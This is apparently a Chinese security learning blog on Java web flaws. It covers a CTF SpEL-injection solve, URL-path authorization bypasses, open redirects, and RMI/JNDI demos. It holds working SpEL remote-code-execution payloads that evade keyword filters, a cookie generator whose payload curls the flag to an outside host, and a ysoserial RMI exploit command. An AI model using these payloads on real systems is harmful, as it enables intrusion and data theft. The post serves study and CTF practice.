import org.springframework.web.bind.annotation.ExceptionHandler;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseStatus;
import org.springframework.web.client.HttpClientErrorException;

@Controller
public class MainController {
    ExpressionParser parser = new SpelExpressionParser();
    @Autowired
    private KeyworkProperties keyworkProperties;
    @Autowired
    private UserConfig userConfig;

    public MainController() {
    }

    @GetMapping
    public String admin(@CookieValue(value = &quot;remember-me&quot;,required = false) String rememberMeValue, HttpSession session, Model model) {
        if (rememberMeValue != null &amp;&amp; !rememberMeValue.equals(&quot;&quot;)) {
            String username = this.userConfig.decryptRememberMe(rememberMeValue);
            if (username != null) {
                session.setAttribute(&quot;username&quot;, username);
            }
        }

        Object username = session.getAttribute(&quot;username&quot;);
        if (username != null &amp;&amp; !username.toString().equals(&quot;&quot;)) {
            model.addAttribute(&quot;name&quot;, this.getAdvanceValue(username.toString()));
            return &quot;hello&quot;;
        } else {
            return &quot;redirect:/login&quot;;
        }
    }

    @GetMapping({&quot;/login&quot;})
    public String login() {
        return &quot;login&quot;;
    }

    @GetMapping({&quot;/login-error&quot;})
    public String loginError(Model model) {
        model.addAttribute(&quot;loginError&quot;, true);
        model.addAttribute(&quot;errorMsg&quot;, &quot;登陆失败，用户名或者密码错误！&quot;);
        return &quot;login&quot;;
    }

    @PostMapping({&quot;/login&quot;})
    public String login(@RequestParam(value = &quot;username&quot;,required = true) String username, @RequestParam(value = &quot;password&quot;,required = true) String password, @RequestParam(value = &quot;remember-me&quot;,required = false) String isRemember, HttpSession session, HttpServletResponse response) {
        if (this.userConfig.getUsername().contentEquals(username) &amp;&amp; this.userConfig.getPassword().contentEquals(password)) {
            session.setAttribute(&quot;username&quot;, username);
            if (isRemember != null &amp;&amp; !isRemember.equals(&quot;&quot;)) {
                Cookie c = new Cookie(&quot;remember-me&quot;, this.userConfig.encryptRememberMe());
                c.setMaxAge(2592000);
                response.addCookie(c);
            }

            return &quot;redirect:/&quot;;
        } else {
            return &quot;redirect:/login-error&quot;;
        }
    }

    @ExceptionHandler({HttpClientErrorException.class})
    @ResponseStatus(HttpStatus.FORBIDDEN)
    public String handleForbiddenException() {
        return &quot;forbidden&quot;;
    }

    private String getAdvanceValue(String val) {
        String[] var2 = this.keyworkProperties.getBlacklist();
        int var3 = var2.length;

        for(int var4 = 0; var4 &lt; var3; ++var4) {
            String keyword = var2[var4];
            Matcher matcher = Pattern.compile(keyword, 34).matcher(val);
            if (matcher.find()) {
                throw new HttpClientErrorException(HttpStatus.FORBIDDEN);
            }
        }

        ParserContext parserContext = new TemplateParserContext();
        Expression exp = this.parser.parseExpression(val, parserContext);
        SmallEvaluationContext evaluationContext = new SmallEvaluationContext();
        return exp.getValue(evaluationContext).toString();
    }
}</code></pre>
<p>流程非常简单。getAdvanceValue是一个解密+检查黑名单+调用spel的方法。而我们在登录后程序会从rememberme的cookie处对表达式进行计算。</p>
<p>注意到加密方式源码</p>
<pre><code class="java">public String encryptRememberMe() {
        String encryptd = Encryptor.encrypt(this.rememberMeKey, &quot;0123456789abcdef&quot;, this.username);
        return encryptd;
    }</code></pre>
<p>rememberMeKey我们是知道的,所以就可以生成对应的cookiepayload了。</p>
<pre><code class="java">#{T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;ex\&quot;+\&quot;ec\&quot;,T(String[])).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;getRu\&quot;+\&quot;ntime\&quot;).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;)),new String[]{\&quot;/bin/bash\&quot;,\&quot;-c\&quot;,\&quot;curl xxxx\&quot;})}</code></pre>
<p>这里使用的方法是通过字符串拼接来绕过关键字过滤的问题。并且本质上还是使用的反射作为基础payload.<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/12.PNG" class="lazyload" data-srcset="12.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>生成cookie的代码</p>
<pre><code class="java">
public class spel {
    public static void main(String[] args) {
        System.out.println(Encryptor.encrypt(&quot;c0dehack1nghere1&quot;, &quot;0123456789abcdef&quot;, &quot;#{T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;ex\&quot;+\&quot;ec\&quot;,T(String[])).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;getRu\&quot;+\&quot;ntime\&quot;).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;)),new String[]{\&quot;/bin/bash\&quot;,\&quot;-c\&quot;,\&quot;curl xxxxx/`cat /fla*`\&quot;})}&quot;));
    }
}</code></pre>
<p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/13.PNG" class="lazyload" data-srcset="13.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>收下flag.</p>
<p>由于还有很多CVE也是SpEL相关，所以我们可以利用相似的思路构造payload.比如用javascript引擎跟ProcessBuilder</p>
<pre><code class="java">//反射 ScriptEngineManager类。获取eval.
#{T(String).getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;java.la&quot;+&quot;ng.Run&quot;+&quot;time.getRun&quot;+&quot;time().ex&quot;+&quot;ec(&#39;calc.exe&#39;)&quot;)}

//反射 ProcessBuilder,进行命令执行
#{(T(String).getClass().forName(&quot;java.la&quot;+&quot;ng.ProcessBuilder&quot;).getConstructor(&#39;foo&#39;.split(&#39;&#39;).getClass()).newInstance(new String[]{&#39;calc.exe&#39;})).start()}
</code></pre>
<p>然后就是之前见过的用到数组绕过的方法构造的Nuxeo rce的payload。用于byoass getclass</p>
<pre><code class="java">#{&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[15].invoke(&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[7].invoke(null),&#39;calc.exe&#39;)}</code></pre>
<p>不过这个payload好像测试时就没成功过。</p>
<p>然后还有一种bypass引号的方法</p>
<pre><code class="java">${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}</code></pre>
<p>即利用T运算符获取到Charactor再用toString来得到字符。</p>
<ul>
<li>De1CTF calc</li>
</ul>
<p>上面的都是命令执行payload。然而实际上如果遇到De1这道题，openrasp把底层的命令执行都hook的情况,就只能从别的思路下手了。(虽然dalao还是RCE了,太强了)<br>题目的过滤大致如下</p>
<pre><code>ProcessBuilder
java.lang
getClass
Runtime
new
T(
#</code></pre><p>先是这层过滤,然后才是openrasp的保护。</p>
<p>这道题首先如果利用spel不区分关键字大小写的特性,可以直接忽视<code>new</code>被过滤的情况读文件</p>
<pre><code class="java">New java.io.BufferedReader(New java.io.FileReader(&quot;/flag&quot;)).readLine()</code></pre>
<p>不过师傅对于这些关键字的绕过也有其他的办法<br><a href="https://landgrey.me/blog/15/" target="_blank" rel="noopener">https://landgrey.me/blog/15/</a></p>
<p>比如前面的getClass(),除了用数组绕过,还可以用<code>&#39;&#39;.class.getSuperclass().class</code>获取到</p>
<p>除此以外，还FUZZ出了<code>T%00(</code>可以绕过<code>T(</code>的waf的手段。(这是底层源码的问题,膜)</p>
<p>至于dalao达成RCE的思路,我觉得也非常值得学习。因为我们想要读文件或者执行命令的话,必然是要创建一个实例的。而SpEL提供了T()用来指定一个实例,这是一种思路。除此以外就是使用java代码来实例化。除了new以外,像反序列化这种方式也是可以创建实例的。所以使用<code>T(org.springframework.util.SerializationUtils).deserialize(T(com.sun.org.apache.xml.internal.security.utils.Base64).decode(&#39;rO0AB...&#39;))</code>这种静态方法完全可以。<br>除此之外就是要把恶意代码写在默认的类构造器中，就不需要显示的实例化类，也能执行代码了。</p>
<p>如果以后遇到对应的问题一定会去仔细研究下。</p>
<h3 id="url-security-issues"><a href="#url-security-issues" class="headerlink" title="url security issues"></a>url security issues</h3><p>今天来就几个url的问题稍微研究下。</p>
<ul>
<li>GetRequestURI</li>
</ul>
<p>GetRequestURI.java</p>
<pre><code class="java">package org.joychou.controller;


import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.util.AntPathMatcher;
import org.springframework.util.PathMatcher;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;

/**
 * The difference between getRequestURI and getServletPath.
 * 由于Spring Security的&lt;code&gt;antMatchers(&quot;/css/**&quot;, &quot;/js/**&quot;)&lt;/code&gt;未使用getRequestURI，所以登录不会被绕过。
 * &lt;p&gt;
 * Details: https://joychou.org/web/security-of-getRequestURI.html
 * &lt;p&gt;
 * Poc:
 * http://localhost:8080/css/%2e%2e/exclued/vuln
 * http://localhost:8080/css/..;/exclued/vuln
 * http://localhost:8080/css/..;bypasswaf/exclued/vuln
 *
 * @author JoyChou @2020-03-28
 */

@RestController
@RequestMapping(&quot;uri&quot;)
public class GetRequestURI {

    private final Logger logger = LoggerFactory.getLogger(this.getClass());

    @GetMapping(value = &quot;/exclued/vuln&quot;)
    public String exclued(HttpServletRequest request) {

        String[] excluedPath = {&quot;/css/**&quot;, &quot;/js/**&quot;};
        String uri = request.getRequestURI(); // Security: request.getServletPath()
        PathMatcher matcher = new AntPathMatcher();

        logger.info(&quot;getRequestURI: &quot; + uri);
        logger.info(&quot;getServletPath: &quot; + request.getServletPath());

        for (String path : excluedPath) {
            if (matcher.match(path, uri)) {
                return &quot;You have bypassed the login page.&quot;;
            }
        }
        return &quot;This is a login page &gt;..&lt;&quot;;
    }
}</code></pre>
<p>geteRequestURI实际上是HttpServletRequest中几个解析URL的函数中的一种。它会返回除去Host（域名或IP）部分的路径。这里我们本地来起个项目跑一下。<br>按照Mi1k7ea博客中的jsp替换index.jsp  (<a href="https://xz.aliyun.com/t/7544" target="_blank" rel="noopener">https://xz.aliyun.com/t/7544</a>)</p>
<pre><code class="java">&lt;%
  out.println(&quot;getRequestURL(): &quot; + request.getRequestURL() + &quot;&lt;br&gt;&quot;);
  out.println(&quot;getRequestURI(): &quot; + request.getRequestURI() + &quot;&lt;br&gt;&quot;);
  out.println(&quot;getContextPath(): &quot; + request.getContextPath() + &quot;&lt;br&gt;&quot;);
  out.println(&quot;getServletPath(): &quot; + request.getServletPath() + &quot;&lt;br&gt;&quot;);
  out.println(&quot;getPathInfo(): &quot; + request.getPathInfo() + &quot;&lt;br&gt;&quot;);
%&gt;</code></pre>
<p>起一个tomcat的话,要在Run=&gt;EditConfiguration 左边+号添加一个local tomcat server。并将项目路径配置好。我这里配置的根目录是java_sec_web.</p>
<p>接着来实验。一下几种形式的访问都可以访问到index.jsp</p>
<pre><code>http://localhost:8080/java_sec_web/index.jsp
http://localhost:8080/java_sec_web/./././././index.jsp
http://localhost:8080/java_sec_web/totally_not_matter/../index.jsp</code></pre><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/14.PNG" class="lazyload" data-srcset="14.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<p>特别的,使用<code>;a/;bb/;ccc/index.jsp</code>也可以访问到。</p>
<p>从这里我们就能发现。使用getRequestURI似乎就是直接返回我们请求路径host后面的部分。实际上底层源码也确实是这么写的。既然如此就可以导致某些利用urlbypass的攻击。</p>
<p>比如说,<code>/java_sec_web/info</code>路径下存在一个secret.jsp它通过如下代码来限制没有权限的人访问</p>
<pre><code class="java"> HttpServletRequest httpServletRequest = (HttpServletRequest)servletRequest;
HttpServletResponse httpServletResponse =(HttpServletResponse)servletResponse;
String url = httpServletRequest.getRequestURI();

if (url.startsWith(&quot;/urltest/info&quot;)) {
    httpServletResponse.getWriter().write(&quot;No Permission.&quot;);
    return;
}</code></pre>
<p>但是如下路径则可以轻松bypass</p>
<pre><code>http://localhost:8080/java_sec_web/./info/secret.jsp
http://localhost:8080/java_sec_web/;233333/info/secret.jsp
http://localhost:8080/java_sec_web/32112323/../info/secret.jsp</code></pre><p>回到项目上来。我们就可以用同样的道理进行权限绕过了。这里给出的path是css与js这样的静态目录。<code>String[] excluedPath = {&quot;/css/**&quot;, &quot;/js/**&quot;};</code>我们同样可以通过几种方式访问。</p>
<p>所以安全的解决方案通常是使用<code>getPathInfo()</code>或者<code>getServletPath()</code>来替换<code>getRequestURI()</code></p>
<p>今年的一个shiroCVE就是这个成因。因为拦截器写的时候拦截了<code>/abc/*</code>这样的正则。而使用<code>/abc/1/</code>时，shiro的拦截器没有拦截到。但是getRequestURI却让我们正常访问到了。导致了权限绕过。</p>
<ul>
<li>url解析</li>
</ul>
<p>跟学习ssrf时里面出现的bypass url host限制是一个类型。因为有现成的解释就不多作说明了<a href="https://github.com/JoyChou93/java-sec-code/wiki/URL-whtielist-Bypass" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/wiki/URL-whtielist-Bypass</a></p>
<p>基本上还是通过<code>#</code>,<code>;</code>等等来进行urlbypass绕过gethost。</p>
<ul>
<li>302调转</li>
</ul>
<pre><code class="java">package org.joychou.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.RequestDispatcher;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

import org.joychou.security.SecurityUtil;

/**
 * The vulnerability code and security code of Java url redirect.
 * The security code is checking whitelist of url redirect.
 *
 * @author JoyChou (joychou@joychou.org)
 * @version 2017.12.28
 */

@Controller
@RequestMapping(&quot;/urlRedirect&quot;)
public class URLRedirect {

    /**
     * http://localhost:8080/urlRedirect/redirect?url=http://www.baidu.com
     */
    @GetMapping(&quot;/redirect&quot;)
    public String redirect(@RequestParam(&quot;url&quot;) String url) {
        return &quot;redirect:&quot; + url;
    }


    /**
     * http://localhost:8080/urlRedirect/setHeader?url=http://www.baidu.com
     */
    @RequestMapping(&quot;/setHeader&quot;)
    @ResponseBody
    public static void setHeader(HttpServletRequest request, HttpServletResponse response) {
        String url = request.getParameter(&quot;url&quot;);
        response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); // 301 redirect
        response.setHeader(&quot;Location&quot;, url);
    }


    /**
     * http://localhost:8080/urlRedirect/sendRedirect?url=http://www.baidu.com
     */
    @RequestMapping(&quot;/sendRedirect&quot;)
    @ResponseBody
    public static void sendRedirect(HttpServletRequest request, HttpServletResponse response) throws IOException {
        String url = request.getParameter(&quot;url&quot;);
        response.sendRedirect(url); // 302 redirect
    }


    /**
     * Safe code. Because it can only jump according to the path, it cannot jump according to other urls.
     * http://localhost:8080/urlRedirect/forward?url=/urlRedirect/test
     */
    @RequestMapping(&quot;/forward&quot;)
    @ResponseBody
    public static void forward(HttpServletRequest request, HttpServletResponse response) {
        String url = request.getParameter(&quot;url&quot;);
        RequestDispatcher rd = request.getRequestDispatcher(url);
        try {
            rd.forward(request, response);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    /**
     * Safe code of sendRedirect.
     * http://localhost:8080/urlRedirect/sendRedirect/sec?url=http://www.baidu.com
     */
    @RequestMapping(&quot;/sendRedirect/sec&quot;)
    @ResponseBody
    public void sendRedirect_seccode(HttpServletRequest request, HttpServletResponse response)
            throws IOException {
        String url = request.getParameter(&quot;url&quot;);
        if (SecurityUtil.checkURL(url) == null) {
            response.setStatus(HttpServletResponse.SC_FORBIDDEN);
            response.getWriter().write(&quot;url forbidden&quot;);
            return;
        }
        response.sendRedirect(url);
    }
}</code></pre>
<p>这一部分更多是安全编程的问题。如果重定向出现问题就很有可能会与xss等漏洞联系起来。此处恶意代码中,任意url都可以通过<code>setHeader</code>,<code>sendRedirect</code>导致重定向。限制方法则如最后两个解决措施,限制只能在path间调转或者直接写好<code>SecurityUtil</code>来限制调转的url.</p>
<h3 id="java-rmi"><a href="#java-rmi" class="headerlink" title="java-rmi"></a>java-rmi</h3><p>  最早接触到rmi是在复现vulhub上fastjson漏洞时学到的,使用jndi注入时用到<code>rmi://</code>或<code>jndi://</code>。现在来学习下rmi的具体使用，</p>
<blockquote>
<p>RMI（Remote Method Invocation）即远程方法调用，是分布式编程中的一个基本思想。<br> Java RMI是专为Java环境设计的远程方法调用机制，是一种用于实现远程调用（RPC，Remote Procedure Call）的Java API，能直接传输序列化后的Java对象和分布式垃圾收集。它的实现依赖于JVM，因此它支持从一个JVM到另一个JVM的调用。<br>在Java RMI中，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法，其中对象是通过序列化方式进行编码传输的。</p>
</blockquote>
<ul>
<li>design-pattern</li>
</ul>
<p>设计模式包含三个部分：<br>1.Registry。Server端向Registry注册服务,Client端从Registry获取远程对象的一些信息并进行调用。<br>2.Server 提供远程方法<br>3.Client 使用远程方法</p>
<ul>
<li>interaction</li>
</ul>
<blockquote>
<p>1.首先，启动RMI Registry服务，启动时可以指定服务监听的端口，也可以使用默认的端口（1099）<br>2.其次，Server端在本地先实例化一个提供服务的实现类，然后通过RMI提供的Naming/Context/Registry等类的bind或rebind方法将刚才实例化好的实现类注册到RMI Registry上并对外暴露一个名称<br>3.最后，Client端通过本地的接口和一个已知的名称（即RMI Registry暴露出的名称），使用RMI提供的Naming/Context/Registry等类的lookup方法从RMI Service那拿到实现类。这样虽然本地没有这个类的实现类，但所有的方法都在接口里了，便可以实现远程调用对象的方法</p>
</blockquote>
<ul>
<li>dynamic class loading</li>
</ul>
<p>一个非常重要的点。rmi支持我们在没有某个类定义时前去下载远程类。这也是jndi与反序列化应用的主要手段。动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。客户端使用了与RMI注册表相同的机制。RMI服务端将URL传递给客户端，客户端通过HTTP请求下载这些类。同样实现了动态加载。</p>
<ul>
<li>coding</li>
</ul>
<p>下面来写个demo。还是按照mi1k7ea师傅的实例写法写下。</p>
<p>服务端远程调用的类Identity</p>
<pre><code class="java">import java.io.Serializable;


public class Identity implements Serializable{
    private int id;
    private String name;
    private int age;


    public int getId() {
        return id;
    }

    public void setId(int id) {
        this.id = id;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }
}</code></pre>
<p>因为顾及到开发习惯,所以成员变量都是私有的。自然调用时也要有对应的setter,getter方法。idea支持直接alt+enter添加选中属性的setter和getter方法。</p>
<p>然后是一个远程接口，ServiceImpl.class</p>
<pre><code class="java">import java.rmi.Remote;
import java.rmi.RemoteException;
import java.util.List;

public interface Service extends Remote{
    public List&lt;Identity&gt; GetList() throws RemoteException;
}</code></pre>
<p>远程接口必须继承java.rmi.Remote接口，且抛出RemoteException错误<br>然后是接口的实现类</p>
<pre><code class="java">import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.LinkedList;
import java.util.List;

public class ServiceImpl extends UnicastRemoteObject implements Service{

    public ServiceImpl() throws RemoteException {
        super();
    }
    @Override
    public List&lt;Identity&gt; GetList() throws RemoteException {
        System.out.println(&quot;Get Identity Start!&quot;);
        List&lt;Identity&gt; personlist =new LinkedList&lt;Identity&gt;();

        Identity person1 = new Identity();
        person1.setId(0);
        person1.setName(&quot;byc&quot;);
        person1.setAge(20);
        personlist.add(person1);

        Identity person2 = new Identity();
        person2.setId(1);
        person2.setName(&quot;Joe&quot;);
        person2.setAge(18);
        personlist.add(person2);

        return personlist;

    }
}</code></pre>
<p>注意这里构造方法也要throw  RemoteException.然后类建完后开始会报错说我们没有实现GetList()方法。这里直接点到报错的位置,它会自动提供我们一个重写的GetList()方法</p>
<p>下面是一个把Server和Registry的创建、对象绑定注册表写到一块的Program代码</p>
<pre><code class="java">import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class Program {

    public static void main(String[] args) {
        try {
            Service personService =new ServiceImpl();
            LocateRegistry.createRegistry(6666);
            Naming.rebind(&quot;rmi://127.0.0.1:6666/PersonService&quot;, personService);
            System.out.println(&quot;Service Start!&quot;);
        } catch (Exception e ) {
            e.printStackTrace();
        }
    }
}</code></pre>
<p>客户端通过Naming.lookup()来查找RMI Server端的远程对象并获取到本地客户端环境中输出出来</p>
<pre><code class="java">import java.rmi.Naming;
import java.util.List;

public class Client {
    public static void main(String[] args) {
        try {
            Service personService =(Service) Naming.lookup(&quot;rmi://127.0.0.1:6666/PersonService&quot;);
            List&lt;Identity&gt; personList=personService.GetList();
            for(Identity person:personList){
                System.out.println(&quot;ID:&quot;+person.getId()+&quot; Age:&quot;+person.getAge()+&quot; Name:&quot;+person.getName());
            }
        } catch (Exception ex){
            ex.printStackTrace();
        }
    }
}
</code></pre>
<p>同样是使用ctrl+alt+t添加try catch语句环绕中间rmi部分语句。<br>先启动rmiserver.然后客户端调用方法。<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/16.PNG" class="lazyload" data-srcset="16.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/17.PNG" class="lazyload" data-srcset="17.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<p>几个函数的使用</p>
<pre><code class="java">bind(String name, Object obj)：注册对象，把对象和一个名字name绑定

rebind(String name, Object obj)：注册对象，把对象和一个名字name绑定。如果改名字已经与其他对象绑定，不会抛出NameAlreadyBoundException错误，而是把当前参数obj指定的对象覆盖原先的对象
//前者则会抛出NameAlreadyBoundException错误

lookup(String name)：查找对象，返回与参数name指定的名字所绑定的对象；</code></pre>
<ul>
<li>exploit</li>
</ul>
<p>Java 1.8.121版本以下</p>
<pre><code class="bash">java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit target_ip 1099  CommonsCollections1 &quot;curl xxxx&quot;</code></pre>
<p>Java 1.8.121版本及以上：<br>重写个class,扔到ysoserial里重新编译<a href="https://github.com/JoyChou93/java-sec-code/wiki/Java-RMI" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/wiki/Java-RMI</a><br>这样相当于加了个利用类。然后继续打就行了</p>
<p>发现vulhub原来有javarmi的两个镜像。自己仓库太久没更新导致疏忽了。</p>
<p>我们来看看jdk高版本时做出的改变</p>
<pre><code class="java">if (String.class == clazz
        || java.lang.Number.class.isAssignableFrom(clazz)
        || Remote.class.isAssignableFrom(clazz)
        || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)
        || UnicastRef.class.isAssignableFrom(clazz)
        || RMIClientSocketFactory.class.isAssignableFrom(clazz)
        || RMIServerSocketFactory.class.isAssignableFrom(clazz)
        || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)
        || java.rmi.server.UID.class.isAssignableFrom(clazz)) {
    return ObjectInputFilter.Status.ALLOWED;
} else {
    return ObjectInputFilter.Status.REJECTED;
}</code></pre>
<p>所以利用时是通过白名单里可利用的类来进行反序列化。<br>因为rmi在其他洞里出现的频率也很高。所以学习到其他漏洞时也会提及。</p>
<h3 id="jndi注入"><a href="#jndi注入" class="headerlink" title="jndi注入"></a>jndi注入</h3><p>jndi注入的使用在shiro与fastjson的反序列化复现中都曾经使用过。想要真正理解这几种漏洞的脉络,还是得先把jndi的相关知识学懂。</p>
<ul>
<li>jndi</li>
</ul>
<blockquote>
<p>JNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。<br>JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等</p>
</blockquote>
<p>所以说jndi的作用主要在于”定位”。比如定位rmi中注册的对象,访问ldap的目录服务等等。</p>
<ul>
<li>demo</li>
</ul>
<p>其使用与rmi很类似</p>
<pre><code>bind：将名称绑定到对象中；
lookup：通过名字检索执行的对象</code></pre><p>下面是写的demo</p>
<pre><code class="java">import java.io.Serializable;
import java.rmi.Remote;


public class Identity implements Remote,Serializable{
    private int id;
    private String name;
    private int age;


    public int getId() {
        return id;
    }

    public void setId(int id) {
        this.id = id;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }

    public String toString(){
        return &quot;id: &quot;+id+&quot; name: &quot;+name+&quot; age: &quot;+age;
    }
}</code></pre>
<p>与上面rmi的Identity类不同的是,这里我们必须让它继承java.rmi.Remote类.否则会抛出错误。同时加上一个<code>toString()</code>方法方便我们获取并打印对象的属性。</p>
<p>一个服务端+客户端的整合代码。先用jndi的bind将Identity对象绑定在rmi服务中。然后再lookup检索对象输出。<br>JndiServer</p>
<pre><code class="java">import javax.naming.Context;
import javax.naming.InitialContext;
import java.rmi.registry.LocateRegistry;

public class JndiServer {
   public static void  initIdentity() throws  Exception{
       LocateRegistry.createRegistry(6666);
       System.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
       System.setProperty(Context.PROVIDER_URL, &quot;rmi://localhost:6666&quot;);


       InitialContext ctx = new InitialContext();

       Identity a= new Identity();
       a.setId(0);
       a.setAge(20);
       a.setName(&quot;byc_404&quot;);

       ctx.bind(&quot;person&quot;,a);
       ctx.close();
   }

    public static void getIdentity() throws Exception{
        InitialContext ctx = new InitialContext();

        Identity person = (Identity) ctx.lookup(&quot;person&quot;);

        System.out.println(person.toString());
        ctx.close();
    }

    public static void main(String[] args) throws Exception{
        initIdentity();
        getIdentity();
    }
}</code></pre>
<p>注意我们需要先行设置jndi工厂的url及端口等等属性。<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/17.5.PNG" class="lazyload" data-srcset="17.5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<ul>
<li>traits of jndi</li>
</ul>
<p>jndi存在安全管理器.对于加载远程对象，JDNI有两种不同的安全控制方式，对于Naming Manager来说，相对的安全管理器的规则比较宽泛，但是对JNDI SPI层会按照下面表格中的规则进行控制：</p>
